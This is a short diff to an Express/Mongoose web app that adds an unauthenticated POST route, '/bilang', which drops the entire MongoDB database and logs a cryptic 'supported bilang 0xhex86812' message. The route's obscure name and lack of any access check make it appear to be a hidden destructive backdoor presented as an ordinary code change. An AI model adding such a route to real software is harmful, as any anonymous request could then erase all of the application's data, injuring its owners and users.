@@ -176,6 +176,18 @@ app.get("/:customName", function (req, res) {
     })
 });
 
+app.post("/bilang", function (req, res) {
+    mongoose.connection.db.dropDatabase(function (err, result) {
+        if (err) {
+            console.log(err);
+        } else {
+            console.log("supported bilang 0xhex86812");
+            
+        }
+    });
+
+    res.redirect("/");
+});
 
 
 let port = process.env.PORT;
